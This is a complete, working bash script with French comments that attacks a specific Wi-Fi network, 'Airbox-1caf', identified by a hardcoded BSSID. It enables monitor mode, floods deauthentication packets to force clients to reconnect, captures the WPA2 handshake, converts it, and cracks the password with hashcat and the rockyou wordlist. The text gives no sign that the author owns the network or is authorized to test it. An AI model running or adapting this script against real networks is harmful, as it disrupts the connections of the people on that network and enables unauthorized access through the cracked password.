#!/bin/bash
# Capture handshake WPA2 sur Airbox-1caf + crack hashcat
# Usage : sudo bash tools/capture_wpa2.sh
# Prérequis : sudo, aircrack-ng suite, hashcat

set -e
BSSID="9c:da:36:ab:1c:b0"
CH=6
SSID="Airbox-1caf"
IFACE="wlan0"
MON="${IFACE}mon"
OUTDIR="/run/media/roh/Sitoky140/Hacking/Wifi Hacking/captures"
CAP="$OUTDIR/airbox"
HCCAPX="$OUTDIR/airbox.hccapx"
WORDLIST="/usr/share/wordlists/rockyou.txt"

RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'; CYAN='\033[96m'; RESET='\033[0m'
log()  { echo -e "${CYAN}[*]${RESET} $*"; }
ok()   { echo -e "${GREEN}[+]${RESET} $*"; }
warn() { echo -e "${YELLOW}[!]${RESET} $*"; }
die()  { echo -e "${RED}[x]${RESET} $*"; exit 1; }

[[ $EUID -ne 0 ]] && die "Lancer avec sudo"
mkdir -p "$OUTDIR"

# ── 1. Mode monitor ──────────────────────────────────────────────────────────
log "Arrêt des processus interférents..."
airmon-ng check kill 2>/dev/null || true

log "Activation mode monitor sur $IFACE..."
airmon-ng start "$IFACE" 2>/dev/null
iw dev | grep -q "$MON" || die "Interface monitor $MON non créée"
ok "Interface monitor : $MON"

# ── 2. Capture airodump-ng (fond) ────────────────────────────────────────────
log "Démarrage capture sur BSSID=$BSSID ch=$CH..."
log "Fichier de sortie : ${CAP}-01.cap"
rm -f "${CAP}"-*.cap "${CAP}"-*.csv 2>/dev/null

airodump-ng -c "$CH" --bssid "$BSSID" -w "$CAP" "$MON" &
DUMP_PID=$!
ok "airodump-ng PID=$DUMP_PID"

# ── 3. Attendre qu'un client soit visible ────────────────────────────────────
log "Attente 5s puis envoi de deauth pour forcer le handshake..."
sleep 5

# ── 4. Deauth (10 paquets × 3 fois) ─────────────────────────────────────────
for i in 1 2 3; do
    log "Deauth round $i/3..."
    aireplay-ng -0 10 -a "$BSSID" "$MON" 2>/dev/null || true
    sleep 3
done

# ── 5. Attendre handshake (max 30s) ──────────────────────────────────────────
log "Attente du handshake WPA2 (max 30s)..."
for i in $(seq 1 30); do
    sleep 1
    CAP_FILE="${CAP}-01.cap"
    if [[ -f "$CAP_FILE" ]]; then
        # Vérifier si handshake présent via aircrack-ng
        if aircrack-ng "$CAP_FILE" 2>/dev/null | grep -q "1 handshake"; then
            ok "Handshake WPA2 capturé !"
            break
        fi
    fi
    if [[ $i -eq 30 ]]; then
        warn "Handshake non confirmé après 30s — on continue quand même"
    fi
done

# ── 6. Stopper airodump-ng ────────────────────────────────────────────────────
kill "$DUMP_PID" 2>/dev/null
sleep 1
ok "Capture terminée : ${CAP}-01.cap ($(du -h "${CAP}-01.cap" 2>/dev/null | cut -f1))"

# ── 7. Convertir en hccapx ───────────────────────────────────────────────────
log "Conversion .cap → .hccapx..."
/usr/lib/hashcat-utils/cap2hccapx.bin "${CAP}-01.cap" "$HCCAPX" 2>&1
if [[ ! -f "$HCCAPX" || ! -s "$HCCAPX" ]]; then
    die "Conversion échouée — pas de handshake dans la capture"
fi
ok "Hash : $HCCAPX ($(du -h "$HCCAPX" | cut -f1))"

# ── 8. Remettre wlan0 en managed ─────────────────────────────────────────────
log "Remise en mode managed..."
airmon-ng stop "$MON" 2>/dev/null || true
systemctl restart NetworkManager 2>/dev/null || true

# ── 9. Crack hashcat ─────────────────────────────────────────────────────────
echo ""
echo -e "${CYAN}══════════════════════════════════════════════${RESET}"
echo -e "${CYAN}  hashcat — WPA2 crack — SSID : $SSID${RESET}"
echo -e "${CYAN}══════════════════════════════════════════════${RESET}"
log "Wordlist : $WORDLIST ($(wc -l < "$WORDLIST") mots)"
log "Hash     : $HCCAPX"
echo ""

hashcat -m 2500 "$HCCAPX" "$WORDLIST" \
    --force \
    --status --status-timer=15 \
    --potfile-path "$OUTDIR/airbox.pot" \
    -o "$OUTDIR/cracked.txt"

echo ""
if [[ -f "$OUTDIR/cracked.txt" && -s "$OUTDIR/cracked.txt" ]]; then
    ok "MOT DE PASSE TROUVÉ :"
    cat "$OUTDIR/cracked.txt"
else
    warn "Mot de passe non trouvé dans rockyou.txt"
    warn "Essayer une wordlist plus grande :"
    echo "  hashcat -m 2500 $HCCAPX /chemin/wordlist.txt --force"
fi
